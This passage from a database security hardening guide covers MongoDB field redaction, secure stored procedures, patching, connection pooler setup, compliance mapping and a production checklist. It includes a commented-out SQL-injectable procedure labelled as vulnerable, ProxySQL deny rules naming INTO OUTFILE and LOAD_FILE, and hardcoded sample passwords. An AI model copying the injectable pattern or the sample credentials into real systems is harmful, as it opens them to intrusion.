GRANT SELECT ON customer_view TO report_user;
```

### MongoDB Field-Level Redaction

```javascript [MongoDB — Aggregation Pipeline Redaction]
// Dynamic redaction based on user role
db.customers.aggregate([
  {
    $redact: {
      $cond: {
        if: {
          // Check if current user has 'pii_access' role
          $in: ["pii_access", "$$USER_ROLES.role"]
        },
        then: "$$DESCEND",   // Show full document
        else: "$$PRUNE"      // Remove sensitive fields
      }
    }
  },
  {
    $project: {
      _id: 1,
      username: 1,
      email: {
        $cond: {
          if: { $in: ["pii_access", "$$USER_ROLES.role"] },
          then: "$email",
          else: {
            $concat: [
              { $substr: ["$email", 0, 1] },
              "***@",
              {
                $arrayElemAt: [
                  { $split: ["$email", "@"] },
                  1
                ]
              }
            ]
          }
        }
      },
      credit_card: {
        $cond: {
          if: { $in: ["pii_access", "$$USER_ROLES.role"] },
          then: "$credit_card",
          else: {
            $concat: [
              "****-****-****-",
              { $substr: ["$credit_card", 15, 4] }
            ]
          }
        }
      },
      city: 1,
      created_at: 1
    }
  }
]);

// Create a view with redaction for report users
db.createView(
  "customers_masked",
  "customers",
  [
    {
      $project: {
        username: 1,
        email: {
          $concat: [
            { $substr: ["$email", 0, 1] },
            "***@",
            { $arrayElemAt: [{ $split: ["$email", "@"] }, 1] }
          ]
        },
        phone: {
          $concat: [
            "***-***-",
            { $substr: ["$phone", 8, 4] }
          ]
        },
        city: 1,
        state: 1,
        created_at: 1
      }
    }
  ]
);
```

---

## 10 — Stored Procedure Security

### Secure Stored Procedure Practices

::tabs
  :::tabs-item{icon="i-lucide-database" label="MySQL"}
  ```sql [MySQL — Secure Stored Procedures]
  -- ═══════════════════════════════════════════
  -- SECURE: Uses INVOKER rights + parameterized
  -- ═══════════════════════════════════════════

  DELIMITER //

  -- SECURITY INVOKER: Runs with caller's privileges
  -- The caller must have permission on the underlying tables
  CREATE PROCEDURE get_user_orders(
      IN p_user_id INT
  )
  SQL SECURITY INVOKER
  READS SQL DATA
  COMMENT 'Securely retrieves orders for a specific user'
  BEGIN
      -- Validate input
      IF p_user_id IS NULL OR p_user_id <= 0 THEN
          SIGNAL SQLSTATE '45000'
              SET MESSAGE_TEXT = 'Invalid user_id parameter';
      END IF;

      -- Parameterized query — safe from SQLi
      SELECT o.id, o.order_date, o.total, o.status
      FROM orders o
      WHERE o.user_id = p_user_id
      ORDER BY o.order_date DESC
      LIMIT 100;
  END//

  -- ═══════════════════════════════════════════
  -- AVOID: Dynamic SQL without parameterization
  -- ═══════════════════════════════════════════

  -- ❌ VULNERABLE stored procedure
  -- CREATE PROCEDURE bad_search(IN p_table VARCHAR(64), IN p_search VARCHAR(255))
  -- BEGIN
  --     SET @sql = CONCAT('SELECT * FROM ', p_table, ' WHERE name = "', p_search, '"');
  --     PREPARE stmt FROM @sql;
  --     EXECUTE stmt;  -- SQL INJECTION!
  -- END//

  -- ✅ SAFE: If dynamic SQL is absolutely necessary, use PREPARE with parameters
  CREATE PROCEDURE safe_search(
      IN p_column VARCHAR(64),
      IN p_search VARCHAR(255)
  )
  SQL SECURITY INVOKER
  READS SQL DATA
  BEGIN
      -- Whitelist allowed columns
      IF p_column NOT IN ('name', 'email', 'city', 'status') THEN
          SIGNAL SQLSTATE '45000'
              SET MESSAGE_TEXT = 'Invalid column name';
      END IF;

      -- Use PREPARE with parameter binding
      SET @sql = CONCAT('SELECT id, name, email FROM users WHERE ', p_column, ' = ?');
      SET @search = p_search;
      PREPARE stmt FROM @sql;
      EXECUTE stmt USING @search;
      DEALLOCATE PREPARE stmt;
  END//

  DELIMITER ;

  -- Grant EXECUTE only (not underlying table access)
  GRANT EXECUTE ON PROCEDURE myapp_db.get_user_orders TO 'app_user'@'10.0.0.%';
  GRANT EXECUTE ON PROCEDURE myapp_db.safe_search TO 'app_user'@'10.0.0.%';
  ```
  :::

  :::tabs-item{icon="i-lucide-database" label="PostgreSQL"}
  ```sql [PostgreSQL — Secure Functions]
  -- ═══════════════════════════════════════════
  -- SECURITY INVOKER (default, recommended)
  -- Runs with the privileges of the calling user
  -- ═══════════════════════════════════════════

  CREATE OR REPLACE FUNCTION get_user_orders(p_user_id INTEGER)
  RETURNS TABLE (
      order_id INTEGER,
      order_date TIMESTAMP,
      total NUMERIC,
      status TEXT
  )
  LANGUAGE plpgsql
  SECURITY INVOKER  -- Caller's privileges
  STABLE            -- Doesn't modify data
  AS $$
  BEGIN
      -- Input validation
      IF p_user_id IS NULL OR p_user_id <= 0 THEN
          RAISE EXCEPTION 'Invalid user_id: %', p_user_id;
      END IF;

      -- Safe parameterized query
      RETURN QUERY
      SELECT o.id, o.order_date, o.total, o.status
      FROM orders o
      WHERE o.user_id = p_user_id
      ORDER BY o.order_date DESC
      LIMIT 100;
  END;
  $$;

  -- ═══════════════════════════════════════════
  -- SECURITY DEFINER (use sparingly!)
  -- Runs with the privileges of the function owner
  -- ═══════════════════════════════════════════

  -- Only use SECURITY DEFINER when the function needs
  -- to access data the caller doesn't have direct access to
  CREATE OR REPLACE FUNCTION check_password(
      p_username TEXT,
      p_password TEXT
  )
  RETURNS BOOLEAN
  LANGUAGE plpgsql
  SECURITY DEFINER  -- Runs as function owner (has SELECT on users)
  STABLE
  AS $$
  DECLARE
      v_match BOOLEAN;
  BEGIN
      -- The caller doesn't have SELECT on users table
      -- But this function can check passwords securely
      SELECT (password_hash = crypt(p_password, password_hash))
      INTO v_match
      FROM users
      WHERE username = p_username AND active = true;

      RETURN COALESCE(v_match, false);
  END;
  $$;

  -- CRITICAL: Revoke direct access, grant only EXECUTE
  REVOKE ALL ON FUNCTION check_password FROM PUBLIC;
  GRANT EXECUTE ON FUNCTION check_password TO app_user;

  -- Set search_path to prevent search_path injection
  ALTER FUNCTION check_password SET search_path = public, pg_temp;
  ```
  :::
::

---

## 11 — Database Patching & Version Management

### Version Tracking and Patching

```bash [Check Current Database Versions]
# MySQL version
mysql -u root -p -e "SELECT VERSION();"
# 8.0.36

# PostgreSQL version
psql -U postgres -c "SELECT version();"
# PostgreSQL 16.2

# MongoDB version
mongosh --eval "db.version()"
# 7.0.5
```

```text [Database End-of-Life Reference (2024)]

  Database          Current Stable    EOL Date       Action Needed
  ────────────────  ──────────────    ────────────   ──────────────
  MySQL 5.7         5.7.44            Oct 2023       ⚠️  UPGRADE NOW
  MySQL 8.0         8.0.36            Apr 2026       ✅ Supported
  MySQL 8.4 LTS     8.4.x             Apr 2032       ✅ Recommended
  MySQL Innovation  9.0.x             N/A            ⚠️  Not for production

  PostgreSQL 12     12.18             Nov 2024       ⚠️  Plan upgrade
  PostgreSQL 13     13.14             Nov 2025       ✅ Supported
  PostgreSQL 14     14.11             Nov 2026       ✅ Supported
  PostgreSQL 15     15.6              Nov 2027       ✅ Supported
  PostgreSQL 16     16.2              Nov 2028       ✅ Recommended

  MongoDB 4.4       4.4.x             Feb 2024       ⚠️  UPGRADE NOW
  MongoDB 5.0       5.0.x             Oct 2024       ⚠️  Plan upgrade
  MongoDB 6.0       6.0.x             Jul 2025       ✅ Supported
  MongoDB 7.0       7.0.x             Aug 2026       ✅ Recommended
```

```bash [Patching Procedure — MySQL]
# 1. Check current version
mysql -e "SELECT VERSION();"

# 2. Check available updates
sudo apt list --upgradable 2>/dev/null | grep mysql

# 3. Take a full backup FIRST
mysqldump --all-databases --single-transaction | gzip > /backup/pre_patch_$(date +%Y%m%d).sql.gz

# 4. Take VM snapshot (if applicable)
# virsh snapshot-create-as --domain mysql-server --name "pre-patch-$(date +%Y%m%d)"

# 5. Apply patch in maintenance window
sudo apt update
sudo apt install --only-upgrade mysql-server mysql-client

# 6. Verify new version
mysql -e "SELECT VERSION();"

# 7. Run mysql_upgrade (MySQL 8.0 — automatic in 8.0.16+)
sudo mysql_upgrade -u root -p

# 8. Check for errors
sudo tail -100 /var/log/mysql/error.log

# 9. Verify application connectivity
mysql -u app_user -p -e "SELECT 1;"

# 10. Monitor for 24 hours before removing snapshot
```

---

## 12 — Connection Pooling Security

```text [Connection Pooling Architecture]

  ┌─────────────────┐
  │  Application    │
  │  Servers (x3)   │
  │  ┌──┐ ┌──┐ ┌──┐│
  │  │A1│ │A2│ │A3││
  │  └──┘ └──┘ └──┘│
  └────┬────┬────┬──┘
       │    │    │
       ▼    ▼    ▼
  ┌──────────────────────────────────────┐
  │       CONNECTION POOLER              │
  │   (PgBouncer / ProxySQL / HAProxy)   │
  │                                      │
  │  • Multiplexes connections           │
  │  • SSL termination                   │
  │  • Query routing (read/write split)  │
  │  • Connection limits                 │
  │  • User authentication              │
  │  • Query caching                    │
  │  • Load balancing                   │
  └──────────┬───────────────────────────┘
             │  (Fewer, persistent connections)
             ▼
  ┌──────────────────────────────────────┐
  │         DATABASE SERVER              │
  │   max_connections = 100              │
  │   (Pooler uses ~20 connections)      │
  └──────────────────────────────────────┘
```

::tabs
  :::tabs-item{icon="i-lucide-database" label="PgBouncer (PostgreSQL)"}
  ```ini [/etc/pgbouncer/pgbouncer.ini]
  [databases]
  myapp_db = host=127.0.0.1 port=15432 dbname=myapp_db

  [pgbouncer]
  listen_addr = 10.0.0.10
  listen_port = 6432
  auth_type = scram-sha-256
  auth_file = /etc/pgbouncer/userlist.txt

  # Connection pooling mode
  pool_mode = transaction    # session, transaction, statement

  # Pool sizing
  default_pool_size = 20
  min_pool_size = 5
  max_client_conn = 200
  max_db_connections = 50

  # Security
  server_tls_sslmode = verify-full
  server_tls_ca_file = /etc/db-ssl/ca-cert.pem
  client_tls_sslmode = require
  client_tls_cert_file = /etc/db-ssl/server-cert.pem
  client_tls_key_file = /etc/db-ssl/server-key.pem

  # Timeouts
  server_connect_timeout = 10
  server_login_retry = 3
  query_timeout = 60
  client_idle_timeout = 300

  # Logging
  log_connections = 1
  log_disconnections = 1
  log_pooler_errors = 1
  stats_period = 60

  # Admin access
  admin_users = pgbouncer_admin
  stats_users = pgbouncer_stats
  ```
  :::

  :::tabs-item{icon="i-lucide-database" label="ProxySQL (MySQL)"}
  ```sql [ProxySQL Configuration]
  -- Connect to ProxySQL admin
  -- mysql -u admin -padmin -h 127.0.0.1 -P 6032

  -- Add MySQL backend servers
  INSERT INTO mysql_servers (hostgroup_id, hostname, port, weight, max_connections)
  VALUES
    (10, '10.0.0.11', 13306, 100, 50),  -- Writer
    (20, '10.0.0.12', 13306, 100, 100), -- Reader 1
    (20, '10.0.0.13', 13306, 100, 100); -- Reader 2

  -- Add application users
  INSERT INTO mysql_users (username, password, default_hostgroup, max_connections)
  VALUES
    ('app_user', 'Str0ng!P@ss#2024', 10, 50);

  -- Read/write split rules
  INSERT INTO mysql_query_rules (rule_id, active, match_pattern, destination_hostgroup, apply)
  VALUES
    (1, 1, '^SELECT .* FOR UPDATE', 10, 1),  -- SELECT FOR UPDATE → Writer
    (2, 1, '^SELECT', 20, 1),                 -- Regular SELECT → Reader
    (3, 1, '.*', 10, 1);                      -- Everything else → Writer

  -- Security: Block dangerous queries
  INSERT INTO mysql_query_rules (rule_id, active, match_pattern, error_msg, apply)
  VALUES
    (100, 1, 'DROP TABLE', 'DROP TABLE is blocked by proxy', 1),
    (101, 1, 'TRUNCATE', 'TRUNCATE is blocked by proxy', 1),
    (102, 1, 'INTO OUTFILE', 'INTO OUTFILE is blocked by proxy', 1),
    (103, 1, 'LOAD_FILE', 'LOAD_FILE is blocked by proxy', 1);

  -- Enable SSL
  SET mysql-have_ssl = 'true';
  SET mysql-ssl_p2s_ca = '/etc/db-ssl/ca-cert.pem';
  SET mysql-ssl_p2s_cert = '/etc/db-ssl/client-cert.pem';
  SET mysql-ssl_p2s_key = '/etc/db-ssl/client-key.pem';

  -- Save and load
  LOAD MYSQL SERVERS TO RUNTIME;
  LOAD MYSQL USERS TO RUNTIME;
  LOAD MYSQL QUERY RULES TO RUNTIME;
  SAVE MYSQL SERVERS TO DISK;
  SAVE MYSQL USERS TO DISK;
  SAVE MYSQL QUERY RULES TO DISK;
  ```
  :::
::

---

## 13 — Compliance Framework Mapping

::collapsible

```text [Compliance Requirements vs Database Security Controls]
═══════════════════════════════════════════════════════════════════════════════
  COMPLIANCE MAPPING: Database Security Controls
═══════════════════════════════════════════════════════════════════════════════

  PCI DSS v4.0                          Database Control
  ──────────────────────────────────    ────────────────────────────────────
  Req 2.2.1: Change defaults           Change default ports, remove defaults
  Req 3.5: Protect stored data          Encryption at rest (TDE, pgcrypto)
  Req 4.2: Encrypt transmissions       SSL/TLS for all connections
  Req 6.2: Secure development          Parameterized queries, code review
  Req 7.1: Least privilege             RBAC, minimal grants
  Req 8.2: Strong authentication       SCRAM-SHA-256, MFA where possible
  Req 8.3: Password policies           Length, complexity, expiration
  Req 10.1: Audit trails               Audit logging (pgAudit, MySQL Audit)
  Req 10.4: Time sync                  NTP for all database servers
  Req 10.7: Log retention              90 days online, 1 year archive
  Req 11.5: File integrity monitoring  Detect config file changes

  GDPR (EU)                            Database Control
  ──────────────────────────────────    ────────────────────────────────────
  Art 5(1)(f): Integrity/Confidential  Encryption at rest + in transit
  Art 25: Privacy by Design            Data masking, field-level encryption
  Art 32: Security of processing       Access controls, audit logs
  Art 33: Breach notification          Real-time monitoring, alerting
  Art 17: Right to erasure             Ability to delete specific user data
  Art 20: Data portability             Export capabilities
  Art 30: Records of processing        Audit logs of data access

  HIPAA                                Database Control
  ──────────────────────────────────    ────────────────────────────────────
  §164.312(a)(1): Access control       RBAC, unique user IDs
  §164.312(a)(2)(iv): Encryption       Data encryption at rest
  §164.312(b): Audit controls          Audit logging, monitoring
  §164.312(c)(1): Integrity            Checksums, backup verification
  §164.312(d): Authentication          Strong passwords, MFA
  §164.312(e)(1): Transmission         SSL/TLS encryption in transit
  §164.312(e)(2)(ii): Encryption       Encrypt ePHI in transit

  SOX (Sarbanes-Oxley)                 Database Control
  ──────────────────────────────────    ────────────────────────────────────
  §302: CEO/CFO certification          Data integrity controls
  §404: Internal controls              Access controls, audit trails
  §802: Record retention               Log retention policies (7 years)
  Segregation of duties                Separate admin/app/audit roles
═══════════════════════════════════════════════════════════════════════════════
```

::

---

## Cloud Database Security

::card-group

::card
---
title: AWS RDS / Aurora
icon: i-simple-icons-amazonaws
---
- Enable **encryption at rest** (KMS) during creation (cannot add later)
- Force **SSL connections** via parameter groups: `rds.force_ssl = 1`
- Use **IAM database authentication** instead of passwords
- Enable **Enhanced Monitoring** and **Performance Insights**
- Configure **Security Groups** (not just VPC)
- Enable **automated backups** with encryption
- Use **AWS Secrets Manager** for credential rotation
- Enable **audit logging** to CloudWatch
::

::card
---
title: GCP Cloud SQL
icon: i-simple-icons-googlecloud
---
- Enable **customer-managed encryption keys** (CMEK)
- Require **SSL for all connections** (server certificate)
- Use **Cloud SQL Auth Proxy** for secure connections
- Configure **authorized networks** (IP allowlisting)
- Enable **query insights** and **audit logging**
- Use **IAM database authentication**
- Enable **automated backups** with PITR
- Set **maintenance windows** for patches
::

::card
---
title: MongoDB Atlas
icon: i-simple-icons-mongodb
---
- Enable **encryption at rest** with AWS KMS / Azure Key Vault / GCP KMS
- Require **TLS for all connections** (enabled by default)
- Use **VPC Peering** or **Private Link** (never public access)
- Configure **IP Access List** (whitelist)
- Enable **Database Auditing** (Enterprise)
- Use **SCRAM-SHA-256** authentication
- Enable **LDAP / x.509** for enterprise auth
- Configure **custom roles** with least privilege
::

::card
---
title: Azure SQL / Cosmos DB
icon: i-simple-icons-microsoftazure
---
- Enable **Transparent Data Encryption** (TDE) — on by default
- Configure **Azure AD authentication** (passwordless)
- Use **Private Endpoints** (no public access)
- Enable **Advanced Threat Protection**
- Configure **auditing** to Log Analytics / Event Hub
- Enable **Dynamic Data Masking**
- Use **Always Encrypted** for sensitive columns
- Configure **Firewall rules** at server level
::

::

---

## Common Misconfigurations

::accordion

  :::accordion-item{icon="i-lucide-alert-triangle" label="Running as root / Administrator"}
  **Risk:** If the database process is compromised, the attacker has root access to the entire server.

  **Fix:**
  ```bash [Run databases as non-root user]
  # MySQL runs as 'mysql' user (verify)
  ps aux | grep mysqld
  # Should show: mysql  1234  ... /usr/sbin/mysqld

  # PostgreSQL runs as 'postgres' user (verify)
  ps aux | grep postgres
  # Should show: postgres  2345  ... /usr/lib/postgresql/16/bin/postgres

  # MongoDB runs as 'mongodb' user (verify)
  ps aux | grep mongod
  # Should show: mongodb  3456  ... /usr/bin/mongod

  # NEVER run with: sudo mysqld or sudo mongod
  ```
  :::

  :::accordion-item{icon="i-lucide-alert-triangle" label="Binding to 0.0.0.0 (All Interfaces)"}
  **Risk:** Database accessible from any network, including the internet.

  **Fix:**
  ```text [Bind to specific interfaces only]
  MySQL:      bind-address = 127.0.0.1        # or specific private IP
  PostgreSQL: listen_addresses = 'localhost'    # or '10.0.0.10'
  MongoDB:    bindIp: 127.0.0.1,10.0.0.10     # NEVER 0.0.0.0
  ```
  :::

  :::accordion-item{icon="i-lucide-alert-triangle" label="No Password on Root / Admin Account"}
  **Risk:** Anyone with network access can take full control of the database.

  **Fix:**
  ```sql [Set strong passwords immediately]
  -- MySQL
  ALTER USER 'root'@'localhost' IDENTIFIED BY 'Str0ng!R00t#P@ss2024';

  -- PostgreSQL (as postgres user)
  ALTER USER postgres WITH PASSWORD 'Str0ng!P0stgr3s#2024';
  ```

  ```javascript [MongoDB]
  use admin
  db.createUser({
    user: "admin",
    pwd: "Str0ng!Adm1n#P@ss2024",
    roles: ["root"]
  })
  ```
  :::

  :::accordion-item{icon="i-lucide-alert-triangle" label="GRANT ALL PRIVILEGES in Production"}
  **Risk:** Application compromise = full database compromise including schema changes, user creation, and data export.

  **Fix:** Grant only the specific privileges the application needs. See Section 2 for examples.
  :::

  :::accordion-item{icon="i-lucide-alert-triangle" label="No SSL/TLS — Plaintext Connections"}
  **Risk:** Credentials and data transmitted in plaintext. Easily intercepted on the network.

  **Fix:** Enable SSL/TLS and require it for all connections. See Section 4 for configuration.
  :::

  :::accordion-item{icon="i-lucide-alert-triangle" label="No Audit Logging"}
  **Risk:** No visibility into who accessed what data, when, or how. Cannot detect breaches or perform forensics.

  **Fix:** Enable audit logging. See Section 6 for configuration.
  :::

  :::accordion-item{icon="i-lucide-alert-triangle" label="Unencrypted Backups"}
  **Risk:** Backup files contain all your data in plaintext. If stolen, it's a complete breach.

  **Fix:** Always encrypt backups. See Section 7 for encrypted backup scripts.
  :::

::

---

## Security Checklist

::collapsible

```text [Database Security Implementation Checklist]
═══════════════════════════════════════════════════════════════════
  DATABASE SECURITY CHECKLIST — Production Readiness
═══════════════════════════════════════════════════════════════════

  NETWORK & ACCESS
  ────────────────
  ☐ Default port changed
  ☐ Bind address set to specific IP (not 0.0.0.0)
  ☐ Firewall rules restrict access to known IPs only
  ☐ Database not directly accessible from internet
  ☐ Rate limiting on connection attempts
  ☐ Connection pooler deployed (PgBouncer/ProxySQL)

  AUTHENTICATION
  ──────────────
  ☐ Strong authentication plugin (SCRAM-SHA-256 / caching_sha2_password)
  ☐ Strong passwords on ALL accounts (14+ chars, complexity)
  ☐ Anonymous users removed
  ☐ Remote root/admin access disabled
  ☐ Password expiration configured
  ☐ Failed login lockout enabled
  ☐ Service accounts use unique credentials
  ☐ Test/default databases removed

  AUTHORIZATION (RBAC)
  ────────────────────
  ☐ Principle of Least Privilege enforced
  ☐ No GRANT ALL PRIVILEGES in production
  ☐ Separate users for app, reporting, backup, monitoring
  ☐ Role-based access control implemented
  ☐ Read/write separation where possible
  ☐ Row-level security for multi-tenant data
  ☐ Regular privilege audits scheduled
  ☐ Unused accounts disabled/removed

  ENCRYPTION
  ──────────
  ☐ SSL/TLS enabled and required for all connections
  ☐ TLS 1.2+ only (TLS 1.0/1.1 disabled)
  ☐ Strong cipher suites configured
  ☐ Certificates from trusted CA (not self-signed in prod)
  ☐ Certificate rotation process documented
  ☐ Encryption at rest enabled (TDE/pgcrypto/WiredTiger)
  ☐ Key management solution deployed
  ☐ Backup encryption enabled

  SQL INJECTION PREVENTION
  ────────────────────────
  ☐ All queries use parameterized statements
  ☐ No string concatenation in SQL queries
  ☐ Input validation on all user inputs
  ☐ Application DB user has minimal privileges
  ☐ Stored procedures reviewed for dynamic SQL
  ☐ ORM configured securely
  ☐ WAF rules for SQL injection detection
  ☐ Regular penetration testing

  AUDIT & MONITORING
  ──────────────────
  ☐ Audit logging enabled (pgAudit/MySQL Audit/MongoDB Audit)
  ☐ DDL changes logged
  ☐ Failed login attempts logged and alerted
  ☐ Privilege changes logged
  ☐ Slow query logging enabled
  ☐ Logs shipped to centralized SIEM
  ☐ Real-time alerting configured
  ☐ Log retention policy defined and enforced
  ☐ Log tampering protection (append-only, remote)

  BACKUP & RECOVERY
  ─────────────────
  ☐ Automated backups running daily
  ☐ Backups encrypted with strong algorithm
  ☐ Backup integrity verified (checksums)
  ☐ Backups stored offsite / air-gapped
  ☐ Point-in-time recovery configured
  ☐ Recovery procedure tested quarterly
  ☐ RTO and RPO defined and achievable
  ☐ Backup access restricted to backup service account

  PATCHING & MAINTENANCE
  ──────────────────────
  ☐ Database version is supported (not EOL)
  ☐ Security patches applied within 30 days
  ☐ Patch testing in staging environment first
  ☐ Rollback procedure documented
  ☐ Vulnerability scanning scheduled
  ☐ CIS Benchmark compliance checked

  DATA PROTECTION
  ───────────────
  ☐ PII/PHI identified and classified
  ☐ Data masking for non-production environments
  ☐ Dynamic data masking for authorized roles
  ☐ Sensitive data encrypted at column level
  ☐ Data retention policy implemented
  ☐ Data deletion procedures tested (GDPR Art 17)

  INFRASTRUCTURE
  ──────────────
  ☐ Database runs as non-root user
  ☐ File system permissions restrictive (700 for data dir)
  ☐ OS hardened (CIS benchmark)
  ☐ Separate data/log/temp partitions
  ☐ Resource limits configured (CPU, memory, connections)
  ☐ High availability / replication configured
  ☐ Disaster recovery plan tested
═══════════════════════════════════════════════════════════════════
```

::

---

## Tool Resources

::card-group

::card
---
title: CIS Benchmarks
icon: i-lucide-shield-check
to: https://www.cisecurity.org/cis-benchmarks
target: _blank
---
Industry-standard security configuration benchmarks for MySQL, PostgreSQL, MongoDB, and more. Free PDF downloads with step-by-step hardening guides.
::

::card
---
title: pgAudit
icon: i-simple-icons-postgresql
to: https://github.com/pgaudit/pgaudit
target: _blank
---
Open-source PostgreSQL audit logging extension. Provides detailed session and object audit logging required for compliance frameworks.
::

::card
---
title: SQLMap
icon: i-simple-icons-github
to: https://sqlmap.org
target: _blank
---
Automated SQL injection detection and exploitation tool. Use it to test your applications before attackers do. Essential for security assessments.
::

::card
---
title: DbGate
icon: i-simple-icons-github
to: https://dbgate.org
target: _blank
---
Open-source database management tool supporting MySQL, PostgreSQL, MongoDB, and more. Useful for secure database administration with SSH tunneling.
::

::card
---
title: Percona Toolkit
icon: i-simple-icons-github
to: https://www.percona.com/software/database-tools/percona-toolkit
target: _blank
---
Collection of advanced MySQL/PostgreSQL tools. Includes pt-query-digest for audit log analysis, pt-config-diff for configuration auditing.
::

::card
---
title: pgBadger
icon: i-simple-icons-postgresql
to: https://pgbadger.darold.net
target: _blank
---
Fast PostgreSQL log analyzer. Generates detailed HTML reports from PostgreSQL logs. Essential for monitoring query patterns and detecting anomalies.
::

::card
---
title: Vault (HashiCorp)
icon: i-simple-icons-vault
to: https://www.vaultproject.io
target: _blank
---
Secrets management and encryption as a service. Dynamic database credentials, automatic rotation, and centralized key management for all databases.
::

::card
---
title: ScoutSuite
icon: i-simple-icons-github
to: https://github.com/nccgroup/ScoutSuite
target: _blank
---
Multi-cloud security auditing tool. Scans AWS RDS, GCP Cloud SQL, and Azure SQL configurations for security misconfigurations and compliance violations.
::

::